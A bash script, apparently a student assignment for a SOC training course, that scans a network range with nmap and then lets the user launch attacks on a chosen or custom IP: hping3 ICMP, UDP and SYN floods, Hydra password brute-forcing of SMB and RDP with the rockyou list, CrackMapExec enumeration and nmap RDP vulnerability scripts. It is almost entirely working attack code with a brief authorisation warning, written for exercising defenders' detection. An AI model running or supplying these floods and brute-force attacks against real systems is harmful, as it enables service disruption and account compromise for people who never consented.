#!/usr/bin/env bash

# ================================================================
# SOC Manager Response Checker
# ================================================================
# Student Name: Matan Ohayon
# Student Code: s22  
# Class Code: TMagen773637
# Lecturer Name: Eliran Berkovich
# 
# Description: Automated discover & Attack utility to check SOC team response
# Tools Used: Nmap, Hydra ,Hping3 ,CrackMapExec/CME, wGet
# 
# Credits and References:
# - ChatGPT / Gemini
# - Classmates
# - YouTube
# ================================================================

# ==================== Colors ==================== #
BOLD_GREEN="\e[1;32m"
RED="\e[1;31m"
YELLOW="\e[1;33m"
RESET="\e[0m"

# ==================== Config & Globals ==================== #
TARGET="$1"

has_ssh=false
has_smb=false
has_rdp=false

# Top-level attack types (we'll add more dynamically)
attacks=("DDoS")

# Services actually found on target
open_services=()

# Logging
LOG_FILE="/var/log/attacks.log"

# Default wordlists (Kali paths)
DEFAULT_USER_WORDLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
DEFAULT_PASS_WORDLIST="/usr/share/wordlists/rockyou.txt"

# ==================== Helper Functions ==================== #

# Check if a tool exists, if not install via apt
check_tool() {
    local tool="$1"
    if ! command -v "$tool" &>/dev/null; then
        echo -e "${YELLOW}[!] $tool not found. Installing...${RESET}"
        sudo apt-get update -y >/dev/null 2>&1
        sudo apt-get install -y "$tool" >/dev/null 2>&1
        if command -v "$tool" &>/dev/null; then
            echo -e "${BOLD_GREEN}[✔] $tool installed successfully.${RESET}"
        else
            echo -e "${RED}[X] Failed to install $tool. Exiting.${RESET}"
            exit 1
        fi
    fi
}

# Log attacks to /var/log
log_attack() {
    local description="$1"
    local target_ip="$2"
    local extra="$3"

    local timestamp
    timestamp=$(date "+%Y-%m-%d %H:%M:%S")

    local line="[$timestamp] $description on $target_ip"
    if [[ -n "$extra" ]]; then
        line+=" ($extra)"
    fi

    # Use sudo to ensure we can write to /var/log
    echo "$line" | sudo tee -a "$LOG_FILE" >/dev/null 2>&1
}

# Spinner for long-running DDoS attacks
spinner() {
    local pid=$1
    local spin='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
    local i=0

    while kill -0 "$pid" 2>/dev/null; do
        i=$(( (i + 1) % ${#spin} ))
        printf "\r${BOLD_GREEN}Sending packets ${spin:$i:1}${RESET}"
        sleep 0.1
    done
    printf "\r${BOLD_GREEN}Attack finished!         ${RESET}\n"
}

# Download wordlist if missing (very basic example)
download_wordlist() {
    local file="$1"
    local url="$2"

    if [[ ! -f "$file" ]]; then
        echo -e "${YELLOW}[!] Wordlist not found: $file${RESET}"
        echo -e "${YELLOW}[!] Attempting to download...${RESET}"
        sudo mkdir -p "$(dirname "$file")"
        check_tool wget
        sudo wget -q -O "$file" "$url"
        if [[ -f "$file" ]]; then
            echo -e "${BOLD_GREEN}[✔] Downloaded $file${RESET}"
        else
            echo -e "${RED}[X] Failed to download $file. Exiting.${RESET}"
            exit 1
        fi
    fi
}

# Ask the user if they want default or custom wordlists
choose_wordlists() {
    local __user_var="$1"
    local __pass_var="$2"

    echo -e "${BOLD_GREEN}Use default wordlists for Hydra?${RESET}"
    echo -e "Users: $DEFAULT_USER_WORDLIST"
    echo -e "Passwords: $DEFAULT_PASS_WORDLIST"
    read -p "Use defaults? (y/n): " wl_choice

    local user_list pass_list

    if [[ "$wl_choice" == "y" || "$wl_choice" == "Y" ]]; then
        # Try to ensure these exist (basic URLs, adjust if needed)
        download_wordlist "$DEFAULT_USER_WORDLIST" "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt"
        download_wordlist "$DEFAULT_PASS_WORDLIST" "https://raw.githubusercontent.com/brannondorsey/naive-hashcat/master/rockyou.txt"
        user_list="$DEFAULT_USER_WORDLIST"
        pass_list="$DEFAULT_PASS_WORDLIST"
    else
        read -p "Enter path to username wordlist: " user_list
        read -p "Enter path to password wordlist: " pass_list

        if [[ ! -f "$user_list" || ! -f "$pass_list" ]]; then
            echo -e "${RED}[X] One or both wordlist files do not exist. Exiting.${RESET}"
            exit 1
        fi
    fi

    # Return via indirect expansion
    eval "$__user_var=\"$user_list\""
    eval "$__pass_var=\"$pass_list\""
}

# Ask user for Hydra speed (threads)
choose_hydra_threads() {
    local threads
    while true; do
        read -p "Choose Hydra thread count (1-8): " threads
        if [[ "$threads" =~ ^[1-8]$ ]]; then
            echo "$threads"
            return
        else
            echo -e "${RED}Invalid thread count. Please choose 1-8.${RESET}"
        fi
    done
}

# ==================== Host Discovery ==================== #

check_tool nmap

available_hosts=($(nmap -sn "$TARGET" \
    | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' \
    | grep -Ev '(\.1$|\.254$|\.255$|\.0$)'))

if [[ ${#available_hosts[@]} -eq 0 ]]; then
    echo -e "${RED}[X] No hosts found for target range $TARGET${RESET}"
    exit 1
fi

echo -e "${BOLD_GREEN}Discovered Hosts:${RESET}"
index=1
for single_ip in "${available_hosts[@]}"; do
    echo -e "${RED}[$index]${RESET} Available Host ${BOLD_GREEN}$single_ip${RESET}"
    ((index++))
done
echo -e "${RED}[R]${RESET} Random Target"
echo -e "${RED}[C]${RESET} Custom IP"

read -p "Choose target number, R for random, or C for custom: " choice

if [[ "$choice" =~ ^[0-9]+$ ]]; then
    # numeric choice
    idx=$((choice - 1))
    if [[ $idx -lt 0 || $idx -ge ${#available_hosts[@]} ]]; then
        echo -e "${RED}[X] Invalid target selection. Exiting.${RESET}"
        exit 1
    fi
    selected_ip=${available_hosts[$idx]}
elif [[ "$choice" == "R" || "$choice" == "r" ]]; then
    rand_index=$((RANDOM % ${#available_hosts[@]}))
    selected_ip=${available_hosts[$rand_index]}
elif [[ "$choice" == "C" || "$choice" == "c" ]]; then
    read -p "Enter custom target IP address: " selected_ip
else
    echo -e "${RED}[X] Invalid input. Exiting.${RESET}"
    exit 1
fi

echo -e "Target chosen ${BOLD_GREEN}$selected_ip${RESET}"

# ==================== DDoS Attack (Hping3) ==================== #

ddos_attack() {
    check_tool hping3

    echo -e "\n${BOLD_GREEN}DDoS Methods for $selected_ip:${RESET}"
    ddos_list=("ICMP Flood" "UDP Flood")

    # Add SYN flood options based on open services (if any)
    for srv in "${open_services[@]}"; do
        ddos_list+=("SYN Flood on $srv")
    done

    local i=0
    for option in "${ddos_list[@]}"; do
        echo -e "${RED}[$i]${RESET} $option"
        ((i++))
    done

    read -p "Choose DDoS option: " ddos_choice

    if ! [[ "$ddos_choice" =~ ^[0-9]+$ ]] || [[ $ddos_choice -lt 0 || $ddos_choice -ge ${#ddos_list[@]} ]]; then
        echo -e "${RED}[X] Invalid DDoS option. Exiting.${RESET}"
        exit 1
    fi

    selected_ddos="${ddos_list[$ddos_choice]}"

    echo -e "\n${BOLD_GREEN}About to Launch: $selected_ddos on $selected_ip${RESET}"
    echo -e "${YELLOW}This sends a large volume of packets to overload the host or service.${RESET}"
    echo -e "${YELLOW}ONLY use on systems you own or have written permission to test.${RESET}"

    read -p "Proceed? (y/n): " confirm
    if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
        echo -e "${RED}Attack cancelled. Exiting...${RESET}"
        exit 0
    fi

    echo -e "${BOLD_GREEN}Launching attack... (CTRL+C to stop)${RESET}"

    case "$selected_ddos" in
        "ICMP Flood")
            log_attack "DDoS ICMP Flood" "$selected_ip" ""
            sudo hping3 --icmp --flood "$selected_ip" >/dev/null 2>&1 &
            spinner $!
            ;;
        "UDP Flood")
            log_attack "DDoS UDP Flood" "$selected_ip" ""
            sudo hping3 --udp --flood "$selected_ip" >/dev/null 2>&1 &
            spinner $!
            ;;
        "SYN Flood on SSH")
            log_attack "DDoS SYN Flood SSH" "$selected_ip" "port:22"
            sudo hping3 -S -p 22 --flood "$selected_ip" >/dev/null 2>&1 &
            spinner $!
            ;;
        "SYN Flood on SMB")
            log_attack "DDoS SYN Flood SMB" "$selected_ip" "ports:445,139"
            sudo hping3 -S -p 445 --flood "$selected_ip" >/dev/null 2>&1 &
            spinner $!
            ;;
        "SYN Flood on RDP")
            log_attack "DDoS SYN Flood RDP" "$selected_ip" "port:3389"
            sudo hping3 -S -p 3389 --flood "$selected_ip" >/dev/null 2>&1 &
            spinner $!
            ;;
    esac
}

# ==================== SMB Attacks ==================== #

smb_bruteforce() {
    check_tool hydra

    echo -e "\n${BOLD_GREEN}SMB Brute Force (Hydra) on $selected_ip${RESET}"
    echo -e "${YELLOW}This will try username/password combinations against SMB (port 445).${RESET}"

    local user_list pass_list
    choose_wordlists user_list pass_list

    local threads
    threads=$(choose_hydra_threads)

    log_attack "SMB Brute (Hydra)" "$selected_ip" "users:$user_list pass:$pass_list threads:$threads"

    hydra -L "$user_list" -P "$pass_list" -t "$threads" smb://"$selected_ip"
}

smb_enum_cme() {
    check_tool crackmapexec

    echo -e "\n${BOLD_GREEN}SMB Enumeration (CrackMapExec) on $selected_ip${RESET}"
    echo -e "${YELLOW}This checks for SMB info and possible anonymous or weak access.${RESET}"

    log_attack "SMB Enum (CrackMapExec)" "$selected_ip" ""

    crackmapexec smb "$selected_ip"
}

smb_attack_menu() {
    if [[ "$has_smb" != true ]]; then
        echo -e "${RED}[X] SMB not detected on target. Exiting.${RESET}"
        exit 1
    fi

    echo -e "\n${BOLD_GREEN}SMB Attack Options:${RESET}"
    echo -e "${RED}[0]${RESET} SMB Brute Force (Hydra)"
    echo -e "${RED}[1]${RESET} SMB Enumeration (CrackMapExec)"

    read -p "Choose SMB attack: " smb_choice

    case "$smb_choice" in
        0) smb_bruteforce ;;
        1) smb_enum_cme ;;
        *) echo -e "${RED}[X] Invalid SMB attack choice. Exiting.${RESET}"; exit 1 ;;
    esac
}

# ==================== RDP Attacks ==================== #

rdp_bruteforce() {
    check_tool hydra

    echo -e "\n${BOLD_GREEN}RDP Brute Force (Hydra) on $selected_ip${RESET}"
    echo -e "${YELLOW}This will try username/password combinations against RDP (port 3389).${RESET}"

    local user_list pass_list
    choose_wordlists user_list pass_list

    local threads
    threads=$(choose_hydra_threads)

    log_attack "RDP Brute (Hydra)" "$selected_ip" "users:$user_list pass:$pass_list threads:$threads"

    hydra -L "$user_list" -P "$pass_list" -t "$threads" rdp://"$selected_ip"
}

rdp_vuln_scan() {
    check_tool nmap

    echo -e "\n${BOLD_GREEN}RDP Vulnerability & Enum Scan (Nmap) on $selected_ip${RESET}"
    echo -e "${YELLOW}This checks for RDP encryption, NLA, and known vulnerabilities.${RESET}"

    log_attack "RDP Enum/Scan (Nmap)" "$selected_ip" "scripts:rdp-*"

    nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 "$selected_ip"
}

rdp_attack_menu() {
    if [[ "$has_rdp" != true ]]; then
        echo -e "${RED}[X] RDP not detected on target. Exiting.${RESET}"
        exit 1
    fi

    echo -e "\n${BOLD_GREEN}RDP Attack Options:${RESET}"
    echo -e "${RED}[0]${RESET} RDP Brute Force (Hydra)"
    echo -e "${RED}[1]${RESET} RDP Vulnerability / Enum Scan (Nmap)"

    read -p "Choose RDP attack: " rdp_choice

    case "$rdp_choice" in
        0) rdp_bruteforce ;;
        1) rdp_vuln_scan ;;
        *) echo -e "${RED}[X] Invalid RDP attack choice. Exiting.${RESET}"; exit 1 ;;
    esac
}

# ==================== Attack Vectors Menu ==================== #

attack_vectors() {

    # Scan services on target
    host_vulns=$(nmap -p- -Pn -sV "$selected_ip")

    echo "$host_vulns" | grep -q "22/tcp"   && has_ssh=true
    echo "$host_vulns" | grep -q "445/tcp"  && has_smb=true && open_services+=("SMB")
    echo "$host_vulns" | grep -q "139/tcp"  && has_smb=true && open_services+=("SMB")
    echo "$host_vulns" | grep -q "3389/tcp" && has_rdp=true && open_services+=("RDP")

    # Build main attack list
    # DDoS already in attacks
    [[ $has_smb == true ]] && attacks+=("SMB Attacks")
    [[ $has_rdp == true ]] && attacks+=("RDP Attacks")

    echo -e "\n${BOLD_GREEN}Available Attack Vectors:${RESET}"
    local i=0
    for attack in "${attacks[@]}"; do
        echo -e "${RED}[$i]${RESET} $attack"
        ((i++))
    done
    echo -e "${RED}[R]${RESET} Random Attack"

    read -p "Choose Attack Vector index or R for random: " attack_choice

    # Handle random attack
    if [[ "$attack_choice" == "R" || "$attack_choice" == "r" ]]; then
        rand_index=$((RANDOM % ${#attacks[@]}))
        selected_attack="${attacks[$rand_index]}"
        echo -e "Randomly selected attack: ${BOLD_GREEN}$selected_attack${RESET}"
    elif [[ "$attack_choice" =~ ^[0-9]+$ ]]; then
        if [[ $attack_choice -lt 0 || $attack_choice -ge ${#attacks[@]} ]]; then
            echo -e "${RED}[X] Invalid attack index. Exiting.${RESET}"
            exit 1
        fi
        selected_attack="${attacks[$attack_choice]}"
        echo -e "Attack chosen ${BOLD_GREEN}$selected_attack${RESET}"
    else
        echo -e "${RED}[X] Invalid input. Exiting.${RESET}"
        exit 1
    fi

    # Show short description (requirement 1.2)
    case "$selected_attack" in
        "DDoS")
            echo -e "${YELLOW}Description:${RESET} Floods target with packets (ICMP/UDP/TCP SYN)."
            ddos_attack
            ;;
        "SMB Attacks")
            echo -e "${YELLOW}Description:${RESET} Attacks SMB (file sharing) via brute-force or enumeration."
            smb_attack_menu
            ;;
        "RDP Attacks")
            echo -e "${YELLOW}Description:${RESET} Attacks Remote Desktop via brute-force or vulnerability scan."
            rdp_attack_menu
            ;;
        *)
            echo -e "${RED}[X] Unknown attack selected. Exiting.${RESET}"
            exit 1
            ;;
    esac
}

# ==================== START PROGRAM ==================== #
attack_vectors
